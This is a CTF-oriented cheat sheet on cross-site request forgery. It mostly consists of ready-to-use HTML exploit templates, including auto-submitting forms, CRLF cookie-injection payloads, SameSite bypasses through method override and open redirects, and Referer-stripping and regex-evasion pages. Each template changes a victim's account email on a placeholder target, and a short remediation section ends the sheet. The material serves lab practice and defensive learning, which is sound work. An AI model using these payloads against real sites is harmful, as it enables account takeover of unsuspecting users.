# CSRF (Cross-Site Request Forgery) — CTF Cheat Sheet

**Tools:** Burp Suite Community / Professional, browser DevTools, Exploit Server  
**Practice:** PortSwigger Web Security Academy  
**Scope:** Authorized CTFs and lab environments only

---

## 1. CTF Methodology

To successfully exploit CSRF in CTFs, verify three prerequisites:

1. **Relevant Action:** A privileged state-changing endpoint exists (e.g., `/my-account/change-email`, `/user/change-password`, `/transfer`).
2. **Cookie-Based Session Handling:** Session identity relies purely on browser cookies (no custom bearer headers like `Authorization: Bearer <token>`).
3. **No Unpredictable Request Parameters:** The request does not validate unpredictable anti-CSRF tokens or passwords, or the token mechanism contains implementation flaws.

```
Identify Target Request (POST /change-email)
          │
          ├── Check for CSRF Token?
          │     ├── None present ───────> Standard CSRF PoC
          │     └── Token present ──────> Test Flawed Implementations
          │                                ├── Change method: POST → GET
          │                                ├── Delete csrf parameter entirely
          │                                ├── Swap with attacker's token (unlinked session)
          │                                └── Test Double-Submit / Cookie injection
          │
          ├── Check SameSite Cookie Attribute?
          │     ├── SameSite=Lax ───────> Test GET/method-override or 2-minute window
          │     └── SameSite=Strict ────> Chain with client-side/open redirect
          │
          └── Check Referer Header Validation?
                ├── Stripped Referer accepted? ──> <meta name="referrer" content="no-referrer">
                └── Weak Regex (domain substring)? ─> Query parameter trick (?target.com)
```

---

## 2. Standard HTML PoC Templates

### Auto-Submitting POST Form

```html
<!DOCTYPE html>
<html>
<body>
    <form id="csrfForm" action="https://TARGET.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="pwned@attacker.net" />
    </form>
    <script>
        document.getElementById('csrfForm').submit();
    </script>
</body>
</html>
```

### Auto-Triggering GET Request

When the action responds to `GET`:
```html
<img src="https://TARGET.net/my-account/change-email?email=pwned@attacker.net" style="display:none;" />
```

---

## 3. Flawed Token Validation Bypasses

### 1. Token Validation Depends on Request Method
Some backends only validate tokens on `POST` requests and skip validation for `GET`.

- **Test:** In Burp Repeater, right-click → **Change request method** (convert `POST` to `GET`). Remove the `csrf` parameter:
  ```http
  GET /my-account/change-email?email=pwned@attacker.net HTTP/2
  ```
- **Exploit PoC:**
  ```html
  <form action="https://TARGET.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="pwned@attacker.net" />
  </form>
  <script>document.forms[0].submit();</script>
  ```

---

### 2. Token Validation Depends on Token Presence
The application validates the token if submitted, but skips validation if the parameter is completely absent.

- **Test:** In Repeater, delete the entire `csrf=...` key-value pair from the POST body (not just the value).
- **Exploit PoC:**
  ```html
  <form action="https://TARGET.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.net" />
      <!-- Omit csrf input completely -->
  </form>
  <script>document.forms[0].submit();</script>
  ```

---

### 3. Token Not Tied to User Session
The server checks whether the token is valid, but does not verify that the token belongs to the user submitting the request.

- **Test:**
  1. Log into your own account (Account A) and capture a valid `csrf` token.
  2. Send a request on Account B with Account B's session cookie, but replace the `csrf` token with Account A's token.
- **Exploit PoC:** Insert your harvested token into the PoC delivered to the victim:
  ```html
  <form action="https://TARGET.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.net" />
      <input type="hidden" name="csrf" value="ATTACKER_VALID_TOKEN" />
  </form>
  <script>document.forms[0].submit();</script>
  ```

---

## 4. Cookie-Tied & Double-Submit Token Bypasses

### 1. Token Tied to Non-Session Cookie (`csrfKey`)
The server validates the `csrf` body parameter against a separate tracking cookie (`csrfKey`), but does not verify whether `csrfKey` belongs to the authenticated session.

- **Attack Chain:** Inject your own `csrfKey` cookie into the victim's browser, then submit the matching `csrf` body token.
- **Cookie Injection Gadget:** Look for CRLF injection, header injection, or endpoints setting search terms into cookies (e.g., `/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY`).
- **Exploit PoC:**
  ```html
  <img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrfKey=ATTACKER_KEY%3b%20SameSite=None" onerror="submitForm()" />
  <form id="csrfForm" action="https://TARGET.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.net" />
      <input type="hidden" name="csrf" value="ATTACKER_MATCHING_TOKEN" />
  </form>
  <script>
      function submitForm() {
          document.getElementById('csrfForm').submit();
      }
  </script>
  ```

---

### 2. Token Duplicated in Cookie (Double-Submit Cookie Flaw)
The application simply compares the `csrf` cookie value with the `csrf` POST parameter without server-side validation.

- **Attack Chain:** Inject any arbitrary string into the victim's `csrf` cookie, then submit the exact same string in the form.
- **Exploit PoC:**
  ```html
  <img src="https://TARGET.net/?search=test%0d%0aSet-Cookie:%20csrf=fakeToken%3b%20SameSite=None" onerror="submitForm()" />
  <form id="csrfForm" action="https://TARGET.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="pwned@attacker.net" />
      <input type="hidden" name="csrf" value="fakeToken" />
  </form>
  <script>
      function submitForm() {
          document.getElementById('csrfForm').submit();
      }
  </script>
  ```

---

## 5. SameSite Cookie Bypasses

### 1. SameSite=Lax Bypass via Method Override
`SameSite=Lax` permits top-level `GET` navigation to carry cookies, but blocks cross-site `POST` cookies.

- **Vulnerability:** The endpoint accepts `_method=POST` inside a `GET` request, or routing frameworks automatically parse GET parameters.
- **Exploit PoC:**
  ```html
  <script>
      document.location = "https://TARGET.net/my-account/change-email?email=pwned@attacker.net&_method=POST";
  </script>
  ```

---

### 2. SameSite=Strict Bypass via Client-Side / Open Redirect
`SameSite=Strict` suppresses cookies on all cross-site requests. However, if the request originates from the target domain itself, cookies are attached.

- **Attack Chain:** Find a client-side or open redirect on the target site (e.g. `/post/comment/confirmation?postId=1`).
- **Exploit PoC:** Redirect the victim to the target's redirect gadget, forwarding to the sensitive action:
  ```html
  <script>
      document.location = "https://TARGET.net/post/comment/confirmation?postId=../my-account/change-email?email=pwned@attacker.net%26submit=1";
  </script>
  ```

---

### 3. Lax 2-Minute Window Bypass
Chromium applies `Lax-allowing-unsafe` behavior to cookies without an explicit `SameSite` attribute for the first 120 seconds after creation, allowing top-level cross-site `POST` requests.

- **Attack Chain:** Force victim authentication/refresh in a popup, wait briefly, then fire POST CSRF.

---

## 6. Referer Header Validation Bypasses

### 1. Validation Depends on Header Presence
The backend validates the `Referer` domain if present, but allows requests if the header is completely stripped.

- **Bypass:** Use the `no-referrer` policy in your exploit page:
  ```html
  <!DOCTYPE html>
  <html>
  <head>
      <meta name="referrer" content="no-referrer">
  </head>
  <body>
      <form action="https://TARGET.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="pwned@attacker.net" />
      </form>
      <script>document.forms[0].submit();</script>
  </body>
  </html>
  ```

---

### 2. Broken Regex Validation (Domain Substring / Query Parameter)
The server merely verifies that `target.net` appears anywhere within the `Referer` URL.

- **Case A: Hostname Substring**  
  Host your exploit on `target.net.attacker.com` or `attacker-target.net`.
- **Case B: Query String Match**  
  If the check accepts `https://attacker.net/?target.net`:
  Ensure the query string is sent by setting `referrer policy` to `unsafe-url` and pushing target domain via `history.pushState`:
  ```html
  <!DOCTYPE html>
  <html>
  <head>
      <meta name="referrer" content="unsafe-url">
  </head>
  <body>
      <script>
          history.pushState('', '', '/?target.net');
      </script>
      <form action="https://TARGET.net/my-account/change-email" method="POST">
          <input type="hidden" name="email" value="pwned@attacker.net" />
      </form>
      <script>
          document.forms[0].submit();
      </script>
  </body>
  </html>
  ```

---

## 7. Burp Suite Workflow

1. **Generate CSRF PoC:**
   - In **Proxy → HTTP history**, find the sensitive request.
   - Right-click → **Engagement tools → Generate CSRF PoC** *(Burp Pro)*.
   - In **Options**, check **Include auto-submit script**.
   - Click **Test in browser** to test execution in an isolated tab.
2. **Community Edition Alternative:**
   - Copy the request headers and body.
   - Fill into the HTML template from Section 2.
3. **Exploit Server Delivery:**
   - Store PoC in the **Exploit Server** body.
   - Click **View exploit** to test with your own account.
   - Click **Deliver exploit to victim** to solve the lab.

---

## 8. CTF Quick Reference

| Defense Scenario | Vulnerability | Exploit Strategy |
|---|---|---|
| **No Defense** | No token, session in cookie | Standard auto-submitting POST form |
| **Token on POST only** | Method not validated | Change method to `GET`, drop token |
| **Optional Token** | Skips validation if missing | Delete `csrf` parameter from POST body |
| **Unlinked Token** | Token from pool, unvalidated user | Harvest token from attacker account, place in victim PoC |
| **Token in Cookie** | `csrfKey` unlinked | Inject attacker's `csrfKey` via CRLF / search injection |
| **Double Submit** | Cookie == body parameter | Inject custom `csrf` cookie + matching body parameter |
| **SameSite=Lax** | Method override supported | `document.location = "...?email=...&_method=POST"` |
| **SameSite=Strict** | Open / Client redirect on origin | Trigger action via local redirect URL |
| **Referer Stripping** | Passes when Referer absent | `<meta name="referrer" content="no-referrer">` |
| **Weak Referer Regex**| Validates substring anywhere | `history.pushState('', '', '/?TARGET.net')` |

---

## 9. Remediation & Best Practices

1. **SameSite Cookie Configuration:**
   Mark sensitive session cookies as `SameSite=Strict` or `SameSite=Lax`:
   ```http
   Set-Cookie: session=xyz; Secure; HttpOnly; SameSite=Strict
   ```
2. **Synchronizer Token Pattern (CSRF Tokens):**
   - Cryptographically strong, unpredictable tokens.
   - Strictly tied to the user's server-side session.
   - Validated server-side on every state-changing method (`POST`, `PUT`, `DELETE`).
3. **Defense-in-Depth:**
   - Require re-authentication or current password confirmation for sensitive actions (email/password change).
   - Use custom headers (e.g., `X-Requested-With: XMLHttpRequest`) for API requests, which cannot be sent cross-origin without CORS preflight approval.
